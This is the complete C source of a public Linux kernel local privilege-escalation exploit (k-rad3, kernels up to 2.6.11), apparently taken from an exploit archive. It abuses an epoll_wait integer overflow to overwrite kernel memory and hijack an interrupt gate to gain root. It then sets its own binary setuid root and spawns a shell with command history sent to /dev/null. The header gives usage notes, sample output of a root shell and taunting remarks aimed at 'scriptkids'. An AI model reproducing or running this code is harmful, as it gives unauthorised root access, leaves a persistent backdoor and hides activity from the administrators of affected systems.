/*
* k-rad3.c - linux 2.6.11 and below CPL 0 kernel local exploit v3
* Discovered and original exploit coded Jan 2005 by sd <sd@fucksheep.org>
*
*********************************************************************
*
* Modified 2005/9 by alert7 <alert7@xfocus.org>
* XFOCUS Security Team http://www.xfocus.org
*
* gcc -o k-rad3 k-rad3.c -static -O2
*
* tested succeed :
*        on default installed RHEL4(2.6.9-5.EL and 2.6.9-5.ELsmp)
*             2.6.9-5.EL ./k-rad3 -p 2
*             2.6.9-5.ELsmp ./k-rad3 -a -p 7
*        on default installed maglic linux 1.2 
*             MagicLinux 2.6.9 #1 ./k-rad3 -t 1 -p 2
*
* thank watercloud tested maglic linux 1.2
* thank eist provide RHEL4 to test
* thank sd <sd@fucksheep.org> share his stuff.
* thank xfocus & xfocus's firends
*
*
* TODO:
*         CASE 1: use stack > 0xc0000000
*         CASE 2: CONFIG_X86_PAE define ,but cpu flag no pse
*
*[alert7@MagicLinux ~]$ ./k-rad3 -h
*[  k-rad3 - <=linux 2.6.11 CPL 0 kernel exploit  ]
*[ Discovered Jan 2005 by sd <sd@fucksheep.org> ]
*[ Modified 2005/9 by alert7 <alert7@xfocus.org> ]
*
*Usage: ./k-rad3
*       -s forced cpu flag pse
*        -a define CONFIG_X86_PAE,default none
*        -e <num> have two kernel code,default 0
*        -p <num> alloc pages(4k) ,default 1. Increase from 1 to 7
*                The higher number the more likely it will crash
*        -t <num> default 0
*                0 :THREAD_SIZE is 4096;otherwise THREAD_SIZE is 8192
*
*[alert7@MagicLinux ~]$ ./k-rad3 -t 1 -p 2
*[  k-rad3 - <=linux 2.6.11 CPL 0 kernel exploit  ]
*[ Discovered Jan 2005 by sd <sd@fucksheep.org> ]
*[ Modified 2005/9 by alert7 <alert7@xfocus.org> ]
*[+] try open /proc/cpuinfo .. ok!!
*[+] find cpu flag pse in /proc/cpuinfo
*[+] CONFIG_X86_PAE :none
*[+] Cpu flag: pse ok
*[+] Exploit Way : 0
*[+] Use 2 pages (one page is 4K ),rewrite 0xc0000000--(0xc0002000 + n)
*[+] thread_size 1 (0 :THREAD_SIZE is 4096;otherwise THREAD_SIZE is 8192
*[+] idtr.base 0xc0461000 ,base 0xc0000000
*[+] kwrite base 0xc0000000, buf 0xbffed750,num 8196
*[+] idt[0x7f] addr 0xffc003f8
*[+] j00 1u(k7 k1d!
*[root@k-rad3 ~] #id
*uid=0(root) gid=0(root) groups=500(alert7)
*
*
*  Linux Kernel <= 2.6.11 "sys_epoll_wait" Local integer overflow Exploit
* 
* "it is possible to partially overwrite low kernel ( >= 2.6 <= 2.6.11) 
* memory due to integer overflow in sys_epoll_wait and misuse of
* __put_user in ep_send_events"
* Georgi Guninski: http://seclists.org/lists/fulldisclosure/2005/Mar/0293.html
*
*********************************************************************
*
*
* In memory of pwned.c (uselib)
* 
* - Redistributions of source code is not permitted.
* - Redistributions in the binary form is not permitted.
* - Redistributions of the above copyright notice, this list of conditions,
* and the following disclaimer is permitted.
* - By proceeding to a Redistribution and under any form of the Program
* the Distributor is granting ownership of his Resources without
* limitations to the copyright holder(s).
*
* 
* Since we already owned everyone, theres no point keeping this private
* anymore.
*
* http://seclists.org/lists/fulldisclosure/2005/Mar/0293.html
*
* Thanks to our internet hero georgi guninski for being such incredible
* whitehat disclosing one of the most reliable kernel bugs.
* You saved the world, man, we owe you one!
*
* This version is somewhat broken, but skilled reader will get an idea.
* Well, at least let the scriptkids have fun for a while.
*
* Thanks to all who helped me developing/testing this, you know who you are,
* and especially to my gf for guidance while coding this.
*
*/

#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <linux/capability.h>
#include <asm/unistd.h>
#ifndef __USE_GNU
	#define __USE_GNU
#endif
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <string.h>

/**
  * Relationship Variables
  *
  * 1: CONFIG_X86_PAE 
  *     see /lib/modules/`uname -r`/build/.config
  *     1.1: pse
  * 2: THREAD_SIZE
  *     see include/asm/thread_info.h THREAD_SIZE define
  */


#define MAP (0xfffff000 - (1023*4096))
#define MAP_PAE (0xfffff000 - (511*4096))
#define MKPTE(addr) ((addr & (~4095)) | 0x27)
#define MKPMD(x) (0x1e3|0x004)

////////////////////////////////////////////////

#define KRADPS1 "k-rad3"

#define kB * 1024
#define MB * 1024 kB
#define GB * 1024 MB

#define KRS "\033[1;30m[ \033[1;37m"
#define KRE "\033[1;30m ]\033[0m"
#define KRAD "\033[1;30m[\033[1;37m*\033[1;30m]\033[0m "
#define KRADP "\033[1;30m[\033[1;37m+\033[1;30m]\033[0m "
#define KRADM "\033[1;30m[\033[1;37m-\033[1;30m]\033[0m "

#define SET_IDT_GATE(idt,ring,s,addr) \
	(idt).off1 = addr & 0xffff; \
	(idt).off2 = addr >> 16; \
	(idt).sel = s; \
	(idt).none = 0; \
	(idt).flags = 0x8E | (ring << 5); 

//config val
static int havepse 		= 0;
static int definePAE	= 0;
static int exploitway	= 0;
static int npages 		= 1;
static int thread_size   = 0;


static uid_t uid		= 0;
static unsigned long long *clear1;
static char * progargv0;

struct idtr {
	unsigned short limit;
	unsigned int base;
} __attribute__ ((packed));

struct idt {
	unsigned short off1;
	unsigned short sel;
	unsigned char none,flags;
	unsigned short off2;
} __attribute__ ((packed));



#define __syscall_return(type, res) \
do { \
	if ((unsigned long)(res) >= (unsigned long)(-125)) { \
	errno = -(res); \
	res = -1; \
	} \
	return (type) (res); \
} while (0)


#define _capget_macro(type,name,type1,arg1,type2,arg2) \
	type name(type1 arg1,type2 arg2) \
	{ \
	long __res; \
	__asm__ volatile ( "int $0x80" \
	: "=a" (__res) \
	: "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
	__syscall_return(type,__res); \
	}

static inline _capget_macro(int,capget,void *,a,void *,b);

static int THREAD_SIZE_MASK =(-4096);


static void 
fatal(const char *message)
{
	system("uname -a");
	printf("[-] %s\n",message);
	exit(1);
}

void kernel(unsigned * task)
{
	unsigned * addr = task;
	/* looking for uids */

	*clear1 = 0;

	while (addr[0] != uid || addr[1] != uid ||
		addr[2] != uid || addr[3] != uid
		)
		addr++;
	
	addr[0] = addr[1] = addr[2] = addr[3] = 0; /* set uids */
	addr[4] = addr[5] = addr[6] = addr[7] = 0; /* set gids */

}
 
void kcode(void);
void __kcode(void)
{
	asm(
	"kcode: \n"
	"cld \n"
	" pusha \n"
	" pushl %es \n"
	" pushl %ds \n"
	" movl %ss,%edx \n"
	" movl %edx,%es \n"
	" movl %edx,%ds \n");
	__asm__("movl %0 ,%%eax" ::"m"(THREAD_SIZE_MASK) );
	asm(
	" andl %esp,%eax \n"
	" pushl (%eax) \n"
	" call kernel \n"
	" addl $4, %esp \n"
	" popl %ds \n"
	" popl %es \n"
	" popa \n"
	" cli \n"
	" iret \n"
	);
}


void raise_cap(unsigned long *ts)
{
/* must be on lower addresses because of kernel arg check :) */
static struct __user_cap_header_struct head;
static struct __user_cap_data_struct data;
static struct __user_cap_data_struct n;

int i;

*clear1 = 0;
head.version = 0x19980330;
head.pid = 0;
capget(&head, &data);
/* scan the thread_struct */
for (i = 0; i < 512; i++, ts++) 
{
	/* is it capabilities block? */
	if (  (ts[0] == data.effective) &&
		(ts[1] == data.inheritable) &&
		(ts[2] == data.permitted)) 
	{
		/* set effective cap to some val */
		ts[0] = 0x12341234;
		capget(&head, &n);
		/* and test if it has changed */
		if (n.effective == ts[0]) 
		{
			/* if so, we're in :) */
			ts[0] = ts[1] = ts[2] = 0xffffffff;
			return;
		}
		/* otherwise fix back the stuff
		(if we've not crashed already :) */
		ts[0] = data.effective;
	}
}
return;
}


void stub(void);
void __stub(void)
{
	asm (
	"stub:;"
	" pusha;"
	);
	__asm__("movl %0 ,%%eax" ::"m"(THREAD_SIZE_MASK) );
	asm(
	" and %esp, %eax;"
	" pushl (%eax);"
	" call raise_cap;"
	" pop %eax;"
	" popa;"
	" iret;"
	);

}


/* write to kernel from buf, num bytes */
static int 
kwrite(unsigned base, char *buf, int num)
{
#define DIV 256
#define RES 4

int efd, c, i, fd;
int pi[2];
struct epoll_event ev;
int *stab;
unsigned long ptr;
int count;
unsigned magic = 0xffffffff / 12 + 1;

	printf("[+] kwrite base %p, buf %p,num %d\n", (void *)base,buf,num);
	/* initialize epoll */
	efd = epoll_create(4096);
	if (efd < 0)
		return -1;
	
	ev.events = EPOLLIN|EPOLLOUT|EPOLLPRI|EPOLLERR|EPOLLHUP;

	/* 12 bytes per fd + one more to be safely in stack space */
	count = (num+11)/12+RES;

	/* desc array */
	stab = alloca((count+DIV-1)/DIV*sizeof(int));

	for (i = 0; i < ((count+DIV-1)/DIV)+1; i++) 
	{

		if (socketpair(AF_UNIX, SOCK_DGRAM, 0, pi) < 0)
			return -1;

		send(pi[0], "a", 1, 0);
		stab[i] = pi[1];
	}

	/* highest fd and first descriptor */
	fd = pi[1];
	/* we've to allocate this separately because we need to have
	it's fd preserved - using this we'll be writing actual bytes */
	epoll_ctl(efd, EPOLL_CTL_ADD, fd, &ev);
	//printf("EPOLL_CTL_ADD count %u\n",count);
	for (i = 0, c = 0; i < (count-1); i++) 
	{
		int n;
		n = dup2(stab[i/DIV], fd+2+(i % DIV));
		if (n < 0)
			return -1;
		epoll_ctl(efd, EPOLL_CTL_ADD, n, &ev);
		close(n);
	}

	/* in 'n' we've the latest fd we're using to write data */
	for (i = 0; i < ((num+7)/8); i++) 
	{
		/* data being written from end */
		memcpy(&ev.data, buf + num - 8 - i * 8, 8);
		epoll_ctl(efd, EPOLL_CTL_MOD, fd, &ev);

		/* the actual kernel magic */
		ptr = (base + num - (i*8)) - (count * 12);
		struct epoll_event *events =(struct epoll_event *)ptr;
		//printf("epoll_wait verify_area(%p,%p) addr %p %p\n",ptr,magic* sizeof(struct epoll_event) ,&events[0].events,magic);
		int iret =epoll_wait(efd, (void *) ptr, magic, 31337);
		if (iret ==-1)
		{
			perror("epoll_wait");
			fatal("This kernel not vulnerability!!!");

		}
		/* don't ask why (rotten rb-trees) :) */
		if (i)
		{
			//printf("epoll_wait verify_area(%p,%p) %p\n",ptr,magic* sizeof(struct epoll_event) ,magic);
			iret = epoll_wait(efd, (void *)ptr, magic, 31337);
	                if (iret ==-1)
        	        {
                	       perror("epoll_wait");
				fatal("This kernel not vulnerability!!!");
	
        	        }

		}
	}

	close(efd);
	for (i = 3; i <= fd; i++)
		close(i);
	
	return 0;
	
}

/* real-mode interrupt table fixup - point all interrupts to iret.
let's hope this will shut up apm */
static void
fixint(char *buf)
{
unsigned *tab = (void *) buf;
int i;

	for (i = 0; i < 256; i++)
		tab[i] = 0x0000400; /* 0000:0400h */
	/* iret */
	buf[0x400] =0xcf; 
}

/* establish pte pointing to virtual addr 'addr' */
static int 
map_pte(unsigned base, int pagenr, unsigned addr)
{
	unsigned *buf = alloca(pagenr * 4096 + 8);
	buf[(pagenr) * 1024] = MKPTE(addr);
	buf[(pagenr) * 1024+1] = 0;	
	fixint((void *)buf);
	return kwrite(base, (void *)buf, pagenr * 4096 + 4);
}

/* make pme user can rw */
static int 
map_pme(unsigned base, int pagenr, unsigned addr)
{
	unsigned *buf = alloca(pagenr * 4096 + 32);
	buf[(pagenr) * 1024] = MKPMD(addr);
	buf[(pagenr) * 1024+1] = 0;	
	buf[(pagenr) * 1024+2] = MKPMD(addr)|0x00200000;
	buf[(pagenr) * 1024+3] = 0;	
	fixint((void *)buf);
	return kwrite(base, (void *)buf, pagenr * 4096 + 4*3);
}


static void 
error(int d)
{
	printf(KRADM "y3r 422 12 n07 3r337 3nuPh!\n" KRAD "Try increase nrpages?\n");
	exit(1);
}

 	char *bashargv[] = { KRADPS1, NULL };
	char *bashenvp[] = { 	"TERM=linux", "PS1=[\\u@"KRADPS1" \\W]\\$ ", "BASH_HISTORY=/dev/null",
					"HISTORY=/dev/null", "history=/dev/null","HISTFILE=/dev/null",
					"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };

static int 
exploit(unsigned kernelbase, int npages)
{
	struct idt *idt;
	struct idtr idtr;



	signal(SIGSEGV, error);
	signal(SIGBUS, error);


	/* get idt descriptor addr */
	asm ("sidt %0" : "=m" (idtr));
	/*
	  * if OS in vmware , idtr.base is not right,please fix it
	  * [alert7@MagicLinux ~]$ cat /boot/System.map|grep idt_table
	  * c0461000 D idt_table
	  * //idtr.base = 0xc0461000;
	  */
	
	printf("[+] idtr.base %p ,base %p\n",(void *)idtr.base , (void *)kernelbase);
	
	if ( !definePAE )
	{
		map_pte(kernelbase, npages, idtr.base - kernelbase);
		//	idt = pae?(void *)MAP_PAE:(void *)MAP;		
		idt = (struct idt *)MAP;
	}else
	{
		/* TODO: pse disable case */
		if ( !havepse)
			printf("[!Waring!] TODO:CONFIG_X86_PAE define ,but cpu flag no pse\n");
		
		map_pme(kernelbase, npages, idtr.base - kernelbase);
		idt = (struct idt *) idtr.base;
	}

#if 0
	int * p = (int *) idt;
	int i;
	for (i=0;i<1024;i++,p++)
		printf( "* %p 0x%x\n",p,*p);
	fflush(stdout);
#endif

	/**
	  * cleanup the stuff to prevent others spotting the gate 
	  * - must be done from ring 0 
	  */
	clear1 = (void *) &idt[0x7f];
	printf("[+] idt[0x7f] addr %p\n",clear1);

	if ( exploitway == 0)
	{
		SET_IDT_GATE(idt[0x7f], 3, idt[0x80].sel, ((unsigned long) &kcode));
	}
	else 
	{
		SET_IDT_GATE(idt[0x7f], 3, idt[0x80].sel, ((unsigned long) &stub));
	}
	
	//[2] SET_IDT_GATE(idt[0x7f], 3, idt[0x80].sel, ((unsigned long) &stub));
	/**
	  * also can use [2] stub function,but it may cause this message
	  *
	  *	Sep 11 13:11:59 AD4 kernel: Debug: sleeping function called from invalid context at include/asm/uaccess.h:531
	  *	Sep 11 13:11:59 AD4 kernel: in_atomic():0[expected: 0], irqs_disabled():1
	  *	Sep 11 13:11:59 AD4 kernel:  [<c011ca30>] __might_sleep+0x7d/0x89
	  *	Sep 11 13:11:59 AD4 kernel:  [<c01270bd>] sys_capget+0x1d5/0x216
	  *	Sep 11 13:11:59 AD4 kernel:  [<c0301bfb>] syscall_call+0x7/0xb
	  *	Sep 11 13:11:59 AD4 kernel:  [<c017007b>] pipe_writev+0x24/0x320
	  *	Sep 11 13:11:59 AD4 kernel:  [<c01619a4>] filp_close+0x59/0x5f
	  *
	  */

	/* call raise_cap or kernel */
	asm ("int $0x7f");
	printf(KRADP "j00 1u(k7 k1d!\n");
	setresuid(0, 0, 0);
	setresgid(0, 0, 0);
	char cmdbuf[1024];
	snprintf(cmdbuf,1024,"chown root %s;chmod +s %s",progargv0,progargv0);
	system(cmdbuf);
	
	execve("/bin/sh", bashargv, bashenvp);
	exit(0);
}



static void 
usage(char *n)
{
		
	printf("\nUsage: %s\n",n);
	printf("\t-s forced cpu flag pse \n");
	printf("\t-a define CONFIG_X86_PAE,default none\n");
	printf("\t-e <num> have two kernel code,default 0\n");
	printf("\t-p <num> alloc pages(4k) ,default 1. Increase from 1 to 7\n"
		 "\t\tThe higher number the more likely it will crash\n");
	printf("\t-t <num> default 0 \n"
		  "\t\t0 :THREAD_SIZE is 4096;otherwise THREAD_SIZE is 8192\n");
	printf("\n");
	_exit(1);
}


/*read /proc/cpuinfo to set  havepse*/
static void 
read_proc(void)
{
            FILE * fp;
            char * line = NULL;
            size_t len = 0;
            ssize_t read;
	     printf("[+] try open /proc/cpuinfo ..");
            fp = fopen("/proc/cpuinfo", "r");
            if (fp == NULL)
            {
                 printf(" failed!!\n");
                 return;
            }
	     printf(" ok!!\n");	
		 
	     int cpus = 0;	
	     int pse = 0;
            while ((read = getline(&line, &len, fp)) != -1) 
		{

		   if (strstr(line,"flags"))
		   {
			if(strstr(line ,"pse "))
			{
				pse ++;
			}
		   }

            }
	     fclose(fp);
		 
            if (line)
                 free(line);
			
	     if ( pse )
		{
				printf("[+] find cpu flag pse in /proc/cpuinfo\n");
				havepse = 1;
	     	}

            return ;

}

static void 
get_config(int ac, char **av)
{
	
	uid = getuid();
	progargv0 = av[0];

	int r;
	
	while(ac) {
		r = getopt(ac, av, "e:p:t:ash");
		
		if(r<0) break;

		switch(r) {

			case 's' :
			//pse
				havepse = 1;
				break;

			case 'a' :
			//define CONFIG_X86_PAE
				definePAE = 1;
				break;

			case 'e' :
				exploitway = atoi(optarg);
				if(exploitway<0) fatal("bad exploitway value");
				break;

			case 'p' :
				npages = atoi(optarg);
				break;
			case 't' :
				thread_size = atoi(optarg);
				
				break;				
				
			case 'h' :
			default:
				usage(av[0]);
				break;
		}
	}	

	THREAD_SIZE_MASK = (thread_size==0)?(-4096):(-8192);

	read_proc();
}

static void 
print_config(unsigned long kernebase)
{
	printf("[+] CONFIG_X86_PAE :%s\n",	definePAE 	?"ok":"none");
	printf("[+] Cpu flag: pse %s\n",			havepse		?"ok":"none");	
	printf("[+] Exploit Way : %d\n",		exploitway);
	printf("[+] Use %d pages (one page is 4K ),rewrite 0x%lx--(0x%lx + n)\n",
			npages,kernebase,kernebase+npages*4 kB);
	printf("[+] thread_size %d (0 :THREAD_SIZE is 4096;otherwise THREAD_SIZE is 8192 \n",thread_size);
	fflush(stdout);
}


void prepare(void)
{
    if (geteuid() == 0) 
    {
	 setresuid(0, 0, 0);
	 setresgid(0, 0, 0);
      	 execve("/bin/sh", bashargv, bashenvp);
        fatal("[-] Unable to spawn shell");
    }
}

int
main(int argc, char **argv)
{
	char eater[65536];
	unsigned long kernelbase;

	/* unlink(argv[0]); */
	// sync();
	
	printf(KRS " "KRADPS1" - <=linux 2.6.11 CPL 0 kernel exploit " KRE "\n"
		KRS "Discovered Jan 2005 by sd <sd@fucksheep.org>" KRE "\n"
		KRS "Modified 2005/9 by alert7 <alert7@xfocus.org>" KRE "\n");

	if ( (unsigned long)eater > 0xc0000000)
	{
		printf("[!Waring!] TODO:use stack > 0xc0000000 \n");
		return 0;
	}
	
	prepare();
	
	get_config(argc,argv);

	kernelbase =(unsigned long)eater ;
	kernelbase +=0x0fffffff;
	kernelbase &=0xf0000000;
	
	print_config(kernelbase);

	exploit(kernelbase, npages<0?-npages:npages);

	return 0;

}

// milw0rm.com [2005-12-30]
